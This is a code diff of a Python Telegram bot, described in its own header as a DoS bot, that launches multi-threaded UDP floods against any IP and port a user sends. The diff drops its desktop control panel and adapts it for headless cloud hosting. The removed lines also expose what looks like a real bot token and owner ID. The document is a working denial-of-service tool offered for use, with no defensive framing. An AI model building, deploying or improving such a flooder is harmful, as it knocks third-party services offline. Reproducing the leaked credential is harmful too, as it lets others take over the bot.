@@ -1,23 +1,36 @@
-# language: Python 3.11, file: main.py, target: any OS
-# pip install python-telegram-bot==21.6 customtkinter
-# run: python main.py
-# Video-jaisa IP:port DoS bot — 60s default, multi-thread UDP flood
+# language: Python 3.11, file: main.py, target: headless (Render/Railway/VPS)
+# pip install python-telegram-bot==21.6 telethon
+# env vars: BOT_TOKEN, OWNER_ID, API_ID, API_HASH (optional userbot ke liye)
 
-# ═══════════════════════════════════════════════
-#  CONFIG
-# ═══════════════════════════════════════════════
-BOT_TOKEN     = "8830686693:AAEedTuVTDTBgVjLa1Io4zEn6xrSLHmJPjU"   # @BotFather
-OWNER_ID      = 8313617737             # @userinfobot
-DEFAULT_DUR   = 60                    # video me 60s
-THREADS       = 8                     # parallel flood threads (weak net: 4)
-PACKET_SIZE   = (512, 1400)           # random size range
+import asyncio
+import os
+import random
+import socket
+import time
+import threading
 
-# ═══════════════════════════════════════════════
-import asyncio, random, socket, sys, time, threading
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+from telegram.ext import (
+    Application, CommandHandler, CallbackQueryHandler, ContextTypes
+)
 
-JOBS = {}          # chat_id -> Job
+# ═══════════════════════════════════════════════
+#  CONFIG — env vars se (Render dashboard me set karo)
+# ═══════════════════════════════════════════════
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+OWNER_ID  = int(os.environ.get("OWNER_ID", "0"))
+API_ID    = int(os.environ.get("API_ID", "0"))
+API_HASH  = os.environ.get("API_HASH", "")
+STRING_SESSION_NAME = os.environ.get("SESSION_NAME", "vc_user")
+
+DEFAULT_DUR = 60
+THREADS     = 8
+PACKET_SIZE = (512, 1400)
+
+if not BOT_TOKEN or not OWNER_ID:
+    raise SystemExit("❌ BOT_TOKEN aur OWNER_ID env vars set karo")
+
+JOBS = {}
 BOT_USERNAME = None
 
 # ═══════════════════════════════════════════════
@@ -69,18 +82,15 @@ class Job:
         self.task = None
 
     def totals(self):
-        p = sum(f.packets for f in self.floods)
-        b = sum(f.bytes_sent for f in self.floods)
-        return p, b
+        return (sum(f.packets for f in self.floods),
+                sum(f.bytes_sent for f in self.floods))
 
 async def run_job(app, job):
-    # threads spawn
     for _ in range(THREADS):
         f = Flood(job.ip, job.port, job.duration)
         job.floods.append(f)
         threading.Thread(target=f.run, daemon=True).start()
 
-    # completion wait
     await asyncio.sleep(job.duration)
     p, b = job.totals()
     try:
@@ -103,7 +113,7 @@ def main_menu():
         [InlineKeyboardButton("🚀 Attack IP", callback_data="m_attack")],
         [InlineKeyboardButton("⏹ Stop", callback_data="m_stop"),
          InlineKeyboardButton("📊 Status", callback_data="m_status")],
-        [InlineKeyboardButton("🧹 Clear msgs", callback_data="m_clear")],
+        [InlineKeyboardButton("🧹 Clear", callback_data="m_clear")],
         [InlineKeyboardButton("📖 Help", callback_data="m_help")],
     ])
 
@@ -193,7 +203,7 @@ async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     lines = ["*📊 Active:*"]
     for cid, j in JOBS.items():
         el = int(time.time() - j.started)
-        p, b = j.totals()
+        p, _ = j.totals()
         lines.append(f"• `{j.ip}:{j.port}` | {el}/{j.duration}s | {p:,} pkt")
     await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
 
@@ -222,7 +232,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     if d == "m_attack":
         await q.edit_message_text(
-            "Duration choose karo, phir `/attack <ip:port> <sec>` bhejo:",
+            "Duration choose, phir `/attack <ip:port> <sec>`:",
             parse_mode="Markdown", reply_markup=dur_menu())
     elif d == "m_stop":
         job = JOBS.get(cid)
@@ -262,144 +272,24 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     elif d.startswith("d_"):
         sec = int(d.split("_")[1])
         await q.edit_message_text(
-            f"⏱ {sec}s set. Ab bhejo:\n`/attack <ip:port> {sec}`",
+            f"⏱ {sec}s. Ab bhejo:\n`/attack <ip:port> {sec}`",
             parse_mode="Markdown")
 
 # ═══════════════════════════════════════════════
-#  PANEL
+#  MAIN
 # ═══════════════════════════════════════════════
-def launch_gui():
-    import customtkinter as ctk
-    ctk.set_appearance_mode("dark")
-    root = ctk.CTk()
-    root.title("ip attack — panel")
-    root.geometry("900x640")
-    root.configure(fg_color="#1e1f22")
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("help", cmd_help))
+    app.add_handler(CommandHandler("attack", cmd_attack))
+    app.add_handler(CommandHandler("stop", cmd_stop))
+    app.add_handler(CommandHandler("status", cmd_status))
+    app.add_handler(CommandHandler("clear", cmd_clear))
+    app.add_handler(CallbackQueryHandler(on_callback))
 
-    side = ctk.CTkFrame(root, fg_color="#2b2d31", width=220, corner_radius=0)
-    side.pack(side="left", fill="y"); side.pack_propagate(False)
-    ctk.CTkLabel(side, text="◈ ATTACK", font=("Segoe UI", 18, "bold"),
-                 text_color="#f2f3f5").pack(pady=(24, 6), padx=20, anchor="w")
-    for l in ["flood", "stats", "logs"]:
-        ctk.CTkButton(side, text=f"  {l}", anchor="w", fg_color="transparent",
-                      hover_color="#3a3c42", text_color="#b5bac1",
-                      height=38).pack(fill="x", padx=10, pady=2)
-    ctk.CTkLabel(side, text="v0.5 · elva",
-                 font=("Segoe UI", 11), text_color="#6d717a"
-                 ).pack(side="bottom", pady=14, padx=20, anchor="w")
-
-    main = ctk.CTkFrame(root, fg_color="#313338", corner_radius=0)
-    main.pack(side="right", fill="both", expand=True)
-    ctk.CTkLabel(main, text="ip attack control",
-                 font=("Segoe UI", 22, "bold"), text_color="#f2f3f5"
-                 ).pack(pady=(24, 2), padx=24, anchor="w")
-    ctk.CTkLabel(main, text=f"udp flood · {DEFAULT_DUR}s default · {THREADS} threads",
-                 font=("Segoe UI", 12), text_color="#949ba4"
-                 ).pack(padx=24, anchor="w", pady=(0, 16))
-
-    row = ctk.CTkFrame(main, fg_color="transparent")
-    row.pack(fill="x", padx=24)
-    ip_entry = ctk.CTkEntry(row, placeholder_text="ip:port",
-                            fg_color="#1e1f22", height=42, font=("Consolas", 13))
-    ip_entry.pack(side="left", fill="x", expand=True, padx=(0, 8))
-    dur_entry = ctk.CTkEntry(row, placeholder_text="sec", width=90,
-                             fg_color="#1e1f22", height=42, font=("Consolas", 13))
-    dur_entry.pack(side="left", padx=(0, 8))
-    dur_entry.insert(0, str(DEFAULT_DUR))
-
-    btn_row = ctk.CTkFrame(main, fg_color="transparent")
-    btn_row.pack(fill="x", padx=24, pady=(12, 0))
-
-    stat_lbl = ctk.CTkLabel(main, text="idle",
-                            font=("Consolas", 13), text_color="#949ba4")
-    stat_lbl.pack(anchor="w", padx=24, pady=(8, 0))
-
-    log_box = ctk.CTkTextbox(main, fg_color="#1e1f22", text_color="#dcddde",
-                             font=("Consolas", 12), corner_radius=8)
-    log_box.pack(fill="both", expand=True, padx=24, pady=(8, 24))
-
-    def push(m):
-        log_box.insert("end", f"{time.strftime('%H:%M:%S')}  {m}\n")
-        log_box.see("end")
-
-    gui_floods = []
-
-    def start_attack():
-        tgt = ip_entry.get().strip()
-        if ":" not in tgt:
-            push("bad ip:port"); return
-        ip, port = tgt.split(":")
-        try: port = int(port)
-        except ValueError: push("bad port"); return
-        try: dur = int(dur_entry.get())
-        except ValueError: dur = DEFAULT_DUR
-        push(f"🚀 attack started → {ip}:{port} for {dur}s")
-        gui_floods.clear()
-        for _ in range(THREADS):
-            f = Flood(ip, port, dur)
-            gui_floods.append(f)
-            threading.Thread(target=f.run, daemon=True).start()
-
-        # live stats ticker
-        def tick():
-            t0 = time.time()
-            while time.time() - t0 < dur:
-                p = sum(f.packets for f in gui_floods)
-                b = sum(f.bytes_sent for f in gui_floods)
-                el = int(time.time() - t0)
-                stat_lbl.configure(
-                    text=f"⏱ {el}/{dur}s · 📦 {p:,} pkt · {b/1024/1024:.1f} MB")
-                time.sleep(1)
-            p = sum(f.packets for f in gui_floods)
-            b = sum(f.bytes_sent for f in gui_floods)
-            stat_lbl.configure(text=f"✅ done · {p:,} pkt · {b/1024/1024:.1f} MB")
-            push(f"✅ finished · {p:,} packets · {b/1024/1024:.1f} MB")
-        threading.Thread(target=tick, daemon=True).start()
-
-    def stop_attack():
-        for f in gui_floods: f.stop()
-        push("⏹ stopped")
-        stat_lbl.configure(text="stopped")
-
-    ctk.CTkButton(btn_row, text="🚀 START", fg_color="#5865f2",
-                  hover_color="#4752c4", height=42, width=130,
-                  font=("Segoe UI", 13, "bold"),
-                  command=start_attack).pack(side="left", padx=(0, 8))
-    ctk.CTkButton(btn_row, text="⏹ STOP", fg_color="#da373c",
-                  hover_color="#a12828", height=42, width=130,
-                  font=("Segoe UI", 13, "bold"),
-                  command=stop_attack).pack(side="left", padx=(0, 8))
-    ctk.CTkButton(btn_row, text="🧹 CLEAR", fg_color="#4e5058",
-                  hover_color="#5c5f66", height=42, width=110,
-                  font=("Segoe UI", 13, "bold"),
-                  command=lambda: log_box.delete("1.0", "end")).pack(side="left")
-
-    def _bot_thread():
-        async def _main():
-            global BOT_USERNAME
-            app_bot = Application.builder().token(BOT_TOKEN).build()
-            me = await app_bot.bot.get_me()
-            BOT_USERNAME = me.username
-            push(f"bot: @{BOT_USERNAME}")
-            app_bot.add_handler(CommandHandler("start", cmd_start))
-            app_bot.add_handler(CommandHandler("help", cmd_help))
-            app_bot.add_handler(CommandHandler("attack", cmd_attack))
-            app_bot.add_handler(CommandHandler("stop", cmd_stop))
-            app_bot.add_handler(CommandHandler("status", cmd_status))
-            app_bot.add_handler(CommandHandler("clear", cmd_clear))
-            app_bot.add_handler(CallbackQueryHandler(on_callback))
-            await app_bot.initialize()
-            await app_bot.start()
-            await app_bot.updater.start_polling()
-            push("bot online ✅")
-            while True: await asyncio.sleep(3600)
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(_main())
-
-    threading.Thread(target=_bot_thread, daemon=True).start()
-    push("panel ready")
-    root.mainloop()
+    print("[+] bot starting (headless)...")
+    app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
-    launch_gui()
+    main()
